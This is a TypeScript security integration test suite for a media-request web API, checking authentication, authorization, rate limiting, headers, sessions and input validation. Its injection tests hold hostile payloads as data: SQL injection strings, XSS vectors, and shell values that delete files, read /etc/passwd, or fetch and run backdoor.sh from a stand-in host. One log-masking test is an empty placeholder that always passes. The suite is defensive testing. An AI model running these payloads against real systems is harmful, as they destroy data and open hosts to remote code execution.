/**
 * SECURITY INTEGRATION TESTS
 *
 * Comprehensive security testing covering authentication, authorization,
 * input validation, and protection against common attacks
 */

import { describe, test, expect, beforeAll, afterAll, beforeEach } from 'vitest';
import request from 'supertest';
import { createServer } from '../../src/server';
import { AuthTestHelper } from '../helpers/auth-test-helper';
import { DatabaseTestHelper } from '../helpers/database-test-helper';

let app: any;
let server: any;
let authHelper: AuthTestHelper;
let dbHelper: DatabaseTestHelper;

describe('Security Integration Tests', () => {
  beforeAll(async () => {
    authHelper = new AuthTestHelper();
    dbHelper = new DatabaseTestHelper();
    await dbHelper.setupTestDatabase();

    app = await createServer();
    server = app.listen(0);
  });

  afterAll(async () => {
    await server?.close();
    await dbHelper.cleanupTestDatabase();
    await authHelper.disconnect();
  });

  beforeEach(async () => {
    await dbHelper.clearTestData();
  });

  describe('Authentication Security', () => {
    test('should prevent brute force attacks', async () => {
      const attempts = Array(10)
        .fill(null)
        .map(() =>
          request(app).post('/api/v1/auth/login').send({
            email: 'nonexistent@test.com',
            password: 'wrongpassword',
          }),
        );

      const responses = await Promise.all(attempts);

      // First few attempts should return 401
      expect(responses[0].status).toBe(401);
      expect(responses[4].status).toBe(401);

      // Later attempts should be rate limited (429)
      const rateLimitedCount = responses.filter((res) => res.status === 429).length;
      expect(rateLimitedCount).toBeGreaterThan(0);
    });

    test('should invalidate tokens on logout', async () => {
      const user = await authHelper.createTestUser();
      const { accessToken, refreshToken } = await authHelper.createUserWithTokens();

      // Token should work initially
      const authorizedResponse = await request(app)
        .get('/api/v1/dashboard/stats')
        .set('Authorization', `Bearer ${accessToken}`)
        .expect(200);

      // Logout
      await request(app)
        .post('/api/v1/auth/logout')
        .set('Authorization', `Bearer ${accessToken}`)
        .send({ refreshToken })
        .expect(200);

      // Token should no longer work
      await request(app)
        .get('/api/v1/dashboard/stats')
        .set('Authorization', `Bearer ${accessToken}`)
        .expect(401);
    });

    test('should prevent token manipulation', async () => {
      const user = await authHelper.createTestUser();
      const validToken = await authHelper.generateAccessToken(user.id);

      // Test with modified token
      const modifiedToken = validToken.slice(0, -5) + 'XXXXX';

      const response = await request(app)
        .get('/api/v1/dashboard/stats')
        .set('Authorization', `Bearer ${modifiedToken}`)
        .expect(401);

      expect(response.body).toHaveProperty('error');
      expect(response.body.error).toContain('Invalid token');
    });

    test('should enforce token expiration', async () => {
      const user = await authHelper.createTestUser();

      // Create expired token
      const expiredPayload = {
        sub: user.id,
        type: 'access',
        iat: Math.floor(Date.now() / 1000) - 7200, // 2 hours ago
        exp: Math.floor(Date.now() / 1000) - 3600, // 1 hour ago (expired)
      };

      const jwt = require('jsonwebtoken');
      const expiredToken = jwt.sign(expiredPayload, process.env.JWT_SECRET || 'test-secret');

      const response = await request(app)
        .get('/api/v1/dashboard/stats')
        .set('Authorization', `Bearer ${expiredToken}`)
        .expect(401);

      expect(response.body.error).toContain('expired');
    });
  });

  describe('Authorization Security', () => {
    test('should prevent privilege escalation', async () => {
      const regularUser = await authHelper.createTestUser();
      const userToken = await authHelper.generateAccessToken(regularUser.id);

      // Try to access admin endpoint
      const response = await request(app)
        .get('/api/v1/admin/users')
        .set('Authorization', `Bearer ${userToken}`)
        .expect(403);

      expect(response.body).toHaveProperty('error');
      expect(response.body.error).toContain('Insufficient permissions');
    });

    test('should prevent horizontal privilege escalation', async () => {
      const user1 = await authHelper.createTestUser('user1@test.com');
      const user2 = await authHelper.createTestUser('user2@test.com');
      const user1Token = await authHelper.generateAccessToken(user1.id);

      // User1 tries to access User2's profile
      const response = await request(app)
        .get(`/api/v1/users/${user2.id}/profile`)
        .set('Authorization', `Bearer ${user1Token}`)
        .expect(403);

      expect(response.body).toHaveProperty('error');
    });

    test('should validate resource ownership', async () => {
      const user1 = await authHelper.createTestUser('user1@test.com');
      const user2 = await authHelper.createTestUser('user2@test.com');
      const user1Token = await authHelper.generateAccessToken(user1.id);

      // Create a media request for user2
      const mediaRequest = await request(app)
        .post('/api/v1/media/request')
        .send({
          title: 'Test Movie',
          year: 2023,
          type: 'movie',
          imdbId: 'tt1234567',
        })
        .set('Authorization', `Bearer ${await authHelper.generateAccessToken(user2.id)}`)
        .expect(201);

      // User1 tries to modify User2's request
      const modifyResponse = await request(app)
        .patch(`/api/v1/media/request/${mediaRequest.body.id}`)
        .send({ notes: 'Hacked!' })
        .set('Authorization', `Bearer ${user1Token}`)
        .expect(403);

      expect(modifyResponse.body).toHaveProperty('error');
    });
  });

  describe('Input Validation Security', () => {
    test('should prevent SQL injection', async () => {
      const user = await authHelper.createTestUser();
      const accessToken = await authHelper.generateAccessToken(user.id);

      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "'; INSERT INTO users (email) VALUES ('hacker@evil.com'); --",
        "' UNION SELECT * FROM users WHERE '1'='1",
      ];

      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .post('/api/v1/media/request')
          .send({
            title: payload,
            year: 2023,
            type: 'movie',
            imdbId: 'tt1234567',
          })
          .set('Authorization', `Bearer ${accessToken}`);

        // Should either be sanitized (200/201) or rejected (400/422)
        expect([200, 201, 400, 422].includes(response.status)).toBe(true);

        // If accepted, title should be sanitized
        if ([200, 201].includes(response.status)) {
          expect(response.body.title).not.toContain('DROP TABLE');
          expect(response.body.title).not.toContain('INSERT INTO');
        }
      }
    });

    test('should prevent XSS attacks', async () => {
      const user = await authHelper.createTestUser();
      const accessToken = await authHelper.generateAccessToken(user.id);

      const xssPayloads = [
        '<script>alert("xss")</script>',
        '<img src=x onerror=alert("xss")>',
        'javascript:alert("xss")',
        '<svg onload=alert("xss")>',
        '"><script>alert("xss")</script>',
        "'; alert('xss'); //",
      ];

      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/v1/media/request')
          .send({
            title: `Movie Title ${payload}`,
            description: `Description with ${payload}`,
            year: 2023,
            type: 'movie',
            imdbId: 'tt1234567',
          })
          .set('Authorization', `Bearer ${accessToken}`);

        // Should either sanitize or reject
        if ([200, 201].includes(response.status)) {
          expect(response.body.title).not.toContain('<script>');
          expect(response.body.title).not.toContain('javascript:');
          expect(response.body.title).not.toContain('onerror=');
          expect(response.body.title).not.toContain('onload=');
        }
      }
    });

    test('should prevent command injection', async () => {
      const user = await authHelper.createTestUser();
      const accessToken = await authHelper.generateAccessToken(user.id);

      const commandInjectionPayloads = [
        '$(rm -rf /)',
        '`cat /etc/passwd`',
        '; ls -la',
        '| whoami',
        '&& curl evil.com',
        '; wget malicious.com/backdoor.sh; chmod +x backdoor.sh; ./backdoor.sh',
      ];

      for (const payload of commandInjectionPayloads) {
        const response = await request(app)
          .post('/api/v1/media/request')
          .send({
            title: `Movie ${payload}`,
            year: 2023,
            type: 'movie',
            imdbId: 'tt1234567',
          })
          .set('Authorization', `Bearer ${accessToken}`);

        // Should sanitize or reject dangerous characters
        if ([200, 201].includes(response.status)) {
          expect(response.body.title).not.toContain('rm -rf');
          expect(response.body.title).not.toContain('cat /etc');
          expect(response.body.title).not.toContain('wget');
          expect(response.body.title).not.toContain('curl');
        }
      }
    });

    test('should enforce input length limits', async () => {
      const user = await authHelper.createTestUser();
      const accessToken = await authHelper.generateAccessToken(user.id);

      // Test extremely long input
      const veryLongTitle = 'A'.repeat(10000);
      const veryLongDescription = 'B'.repeat(50000);

      const response = await request(app)
        .post('/api/v1/media/request')
        .send({
          title: veryLongTitle,
          description: veryLongDescription,
          year: 2023,
          type: 'movie',
          imdbId: 'tt1234567',
        })
        .set('Authorization', `Bearer ${accessToken}`)
        .expect(400);

      expect(response.body).toHaveProperty('error');
      expect(response.body.error).toContain('too long');
    });
  });

  describe('HTTP Security Headers', () => {
    test('should include security headers', async () => {
      const response = await request(app).get('/api/v1/health').expect(200);

      // Check for security headers
      expect(response.headers).toHaveProperty('x-frame-options');
      expect(response.headers).toHaveProperty('x-content-type-options');
      expect(response.headers).toHaveProperty('x-xss-protection');
      expect(response.headers).toHaveProperty('strict-transport-security');

      // Verify header values
      expect(response.headers['x-frame-options']).toBe('DENY');
      expect(response.headers['x-content-type-options']).toBe('nosniff');
    });

    test('should implement CORS correctly', async () => {
      const response = await request(app)
        .options('/api/v1/health')
        .set('Origin', 'https://medianest.app')
        .expect(200);

      expect(response.headers).toHaveProperty('access-control-allow-origin');
      expect(response.headers).toHaveProperty('access-control-allow-methods');
      expect(response.headers).toHaveProperty('access-control-allow-headers');
    });

    test('should reject unauthorized origins', async () => {
      const response = await request(app).get('/api/v1/health').set('Origin', 'https://evil.com');

      // Should either reject or not include CORS headers for unauthorized origins
      if (response.headers['access-control-allow-origin']) {
        expect(response.headers['access-control-allow-origin']).not.toBe('https://evil.com');
      }
    });
  });

  describe('Rate Limiting Security', () => {
    test('should implement API rate limiting', async () => {
      const user = await authHelper.createTestUser();
      const accessToken = await authHelper.generateAccessToken(user.id);

      // Make many rapid requests
      const rapidRequests = Array(50)
        .fill(null)
        .map(() =>
          request(app).get('/api/v1/dashboard/stats').set('Authorization', `Bearer ${accessToken}`),
        );

      const responses = await Promise.allSettled(rapidRequests);
      const statuses = responses.map((r) => (r.status === 'fulfilled' ? r.value.status : 500));

      // Should have some rate limited responses
      const rateLimited = statuses.filter((status) => status === 429).length;
      expect(rateLimited).toBeGreaterThan(0);
    });

    test('should implement per-endpoint rate limiting', async () => {
      const user = await authHelper.createTestUser();
      const accessToken = await authHelper.generateAccessToken(user.id);

      // Test rate limiting on sensitive endpoints
      const sensitiveRequests = Array(20)
        .fill(null)
        .map(() =>
          request(app)
            .post('/api/v1/media/request')
            .send({
              title: 'Rate Limit Test',
              year: 2023,
              type: 'movie',
              imdbId: 'tt1234567',
            })
            .set('Authorization', `Bearer ${accessToken}`),
        );

      const responses = await Promise.allSettled(sensitiveRequests);
      const statuses = responses.map((r) => (r.status === 'fulfilled' ? r.value.status : 500));

      // Should rate limit media requests more aggressively
      const rateLimited = statuses.filter((status) => status === 429).length;
      expect(rateLimited).toBeGreaterThan(5); // At least 25% should be rate limited
    });
  });

  describe('Session Security', () => {
    test('should implement secure session management', async () => {
      const user = await authHelper.createTestUser();

      const loginResponse = await request(app)
        .post('/api/v1/auth/login')
        .send({
          email: user.email,
          password: 'password123',
        })
        .expect(200);

      // Check for secure cookie attributes
      const setCookieHeader = loginResponse.headers['set-cookie'];
      if (setCookieHeader) {
        const cookieString = setCookieHeader[0];
        expect(cookieString).toContain('HttpOnly');
        expect(cookieString).toContain('Secure');
        expect(cookieString).toContain('SameSite');
      }
    });

    test('should prevent session fixation', async () => {
      const user = await authHelper.createTestUser();

      // Get initial session
      const initialResponse = await request(app).get('/api/v1/auth/session').expect(200);

      const initialSession = initialResponse.headers['set-cookie'];

      // Login
      const loginResponse = await request(app)
        .post('/api/v1/auth/login')
        .send({
          email: user.email,
          password: 'password123',
        })
        .set('Cookie', initialSession)
        .expect(200);

      // Session should be regenerated after login
      const newSession = loginResponse.headers['set-cookie'];
      if (initialSession && newSession) {
        expect(newSession[0]).not.toBe(initialSession[0]);
      }
    });
  });

  describe('Data Protection', () => {
    test('should not expose sensitive information in errors', async () => {
      // Test with various error conditions
      const errorScenarios = [
        { endpoint: '/api/v1/auth/login', data: { email: 'test', password: 'test' } },
        { endpoint: '/api/v1/users/nonexistent', data: {} },
        { endpoint: '/api/v1/media/request/invalid-id', data: {} },
      ];

      for (const scenario of errorScenarios) {
        const response = await request(app).post(scenario.endpoint).send(scenario.data);

        // Error responses should not contain sensitive information
        const responseText = JSON.stringify(response.body).toLowerCase();

        expect(responseText).not.toContain('password');
        expect(responseText).not.toContain('secret');
        expect(responseText).not.toContain('key');
        expect(responseText).not.toContain('token');
        expect(responseText).not.toContain('database');
        expect(responseText).not.toContain('stack trace');
        expect(responseText).not.toContain('prisma');
        expect(responseText).not.toContain('sql');
      }
    });

    test('should mask sensitive data in logs', async () => {
      const user = await authHelper.createTestUser();

      // Perform login (which should be logged)
      await request(app).post('/api/v1/auth/login').send({
        email: user.email,
        password: 'password123',
      });

      // In a real test, you would check log files or mock the logger
      // to verify that passwords and tokens are masked
      expect(true).toBe(true); // Placeholder for actual log checking
    });
  });

  describe('File Upload Security', () => {
    test('should validate file types and sizes', async () => {
      const user = await authHelper.createTestUser();
      const accessToken = await authHelper.generateAccessToken(user.id);

      // Test malicious file upload (if file upload is supported)
      const maliciousFile = Buffer.from('<?php echo "hacked"; ?>');

      const response = await request(app)
        .post('/api/v1/users/avatar')
        .attach('file', maliciousFile, 'malicious.php')
        .set('Authorization', `Bearer ${accessToken}`);

      // Should reject non-image files
      expect([400, 415, 422].includes(response.status)).toBe(true);
    });
  });
});
